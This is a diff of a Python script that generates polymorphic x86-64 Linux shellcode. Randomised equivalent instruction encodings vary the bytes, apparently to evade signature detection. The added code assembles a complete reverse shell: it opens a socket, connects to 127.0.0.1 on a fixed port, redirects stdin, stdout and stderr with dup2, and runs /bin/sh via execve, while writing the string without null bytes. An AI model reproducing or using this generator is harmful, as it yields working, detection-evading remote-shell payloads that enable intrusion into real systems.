@@ -33,11 +33,46 @@ def setRegToZero(reg):
     
     return chunk
 
+def preciseMovToMemory(value):
+    chunk = bytearray()
+    value = bytearray(value)
+
+    case = random.randint(1,1)
+
+    match case:
+        case 1: #mov to address method
+            precisemov = bytearray([0x48,0x89,0xE3])
+            for i in range(len(value)):
+                if value[i] != 0:
+                    precisemov.append(0xC6)
+                    precisemov.append((0x03))
+                    precisemov.append(value[i])
+                    precisemov.append(0x48)
+                    precisemov.append(0xff)
+                    precisemov.append(0xC3)
+                else:
+                    precisemov.append(0xC6)
+                    precisemov.append((0x03))
+                    precisemov.append(value[i]+1)
+
+                    
+                    
+                    precisemov.append(0x80)
+                    precisemov.append(0x2B)
+                    precisemov.append(0x01)
+
+                    precisemov.append(0x48)
+                    precisemov.append(0xff)
+                    precisemov.append(0xC3)
+            chunk += precisemov
+
+                
+    return chunk
 
 def movValueToReg(reg,value):
     chunk = bytearray()
-    case = random.randint(1,2)
-    case = 3
+    case = random.randint(1,3)
+    
     
     match case:
         case 1: # The push, pop, neg method
@@ -68,7 +103,7 @@ def movValueToReg(reg,value):
             inc_ope = bytearray([0x48,0xff,(0xC0+registerDictionary[reg])])
             chunk += inc_ope
         case 3: # the mov and shift method
-            value = bytearray(struct.pack(">q",value))
+            value = bytearray(struct.pack(">i",value))
             mov_n_shift = bytearray()
             if reg  in  ("rax" , "rcx" , "rdx" , "rbx"): 
                 for i in value:
@@ -182,7 +217,25 @@ def pushDWORDToStack(reg):
 
     return chunk
 
+def movRegtoReg(regsrc,regdst):
+    chunk = bytearray()
+    case = random.randint(1,2)
 
+    match case:
+        case 1: #push and pop method 
+            push = bytearray([0x50+(registerDictionary[regsrc])])
+            pop = bytearray([0x58+(registerDictionary[regdst])])
+            chunk += push
+            chunk += pop
+        case 2: #mov method
+            mov = bytearray([0x48,0x89,(0xC0+(registerDictionary[regsrc]*8)+(registerDictionary[regdst]))])
+            chunk += mov
+        case 3: # The xor method
+            xor = setRegToZero(regdst)
+            xor += bytearray([0x48,0x31,(0xC0+(registerDictionary[regsrc]*8)+(registerDictionary[regdst]))]) 
+
+
+    return chunk
 
 
 ip = "127.0.0.1"
@@ -201,9 +254,51 @@ registerDictionary = {"rax":0,"rcx":1,"rdx":2,"rbx":3,"rsp":4,"rbp":5,"rsi":6,"r
 syscall = bytearray([0x0f,0x05])
 shellcode = bytearray()
 
-shellcode += movValueToReg("rdi",0x4789)
-shellcode += movValueToReg("rbx",0x1234567812345678)
+shellcode += movValueToReg("rdi",0x02)
+shellcode += movValueToReg("rsi",0x01)
+shellcode += setRegToZero("rdx")
+shellcode += movValueToReg("rax",0x29)
+shellcode += syscall # socket
 
+shellcode += movRegtoReg("rax","rdi")
+
+
+# sub something to rsp
+
+shellcode += movValueToReg("rax",0x0002)
+shellcode += movWORDToMemory(0,"rax")
+shellcode +=movValueToReg("rax",0x5100)
+shellcode += movWORDToMemory(2,"rax")
+shellcode +=movValueToReg("rax",0x0100007f)
+shellcode += movDWORDToMemory(4,"rax")
+shellcode += setRegToZero("rax")
+shellcode += movQWORDToMemory(8,"rax")
+
+shellcode += movRegtoReg("rsp","rsi")
+
+shellcode += movValueToReg("rdx",0x10)
+shellcode += movValueToReg("rax",0x2a)
+shellcode += syscall # connect
+
+
+shellcode  += setRegToZero("rsi")
+shellcode += movValueToReg("rax",0x21)
+shellcode += syscall # dup2
+shellcode += movValueToReg("rsi",0x01)
+shellcode += movValueToReg("rax",0x21)
+shellcode += syscall # dup2
+shellcode += movValueToReg("rsi",0x02)
+shellcode += movValueToReg("rax",0x21)
+shellcode += syscall # dup2
+
+
+shellcode += preciseMovToMemory(b'/bin/sh\x00')
+shellcode += movRegtoReg("rsp","rdi")
+shellcode += setRegToZero("rsi")
+shellcode += setRegToZero("rdx")
+shellcode += movValueToReg("rax",0x3b)  
+
+shellcode += syscall # execve
 
 
 
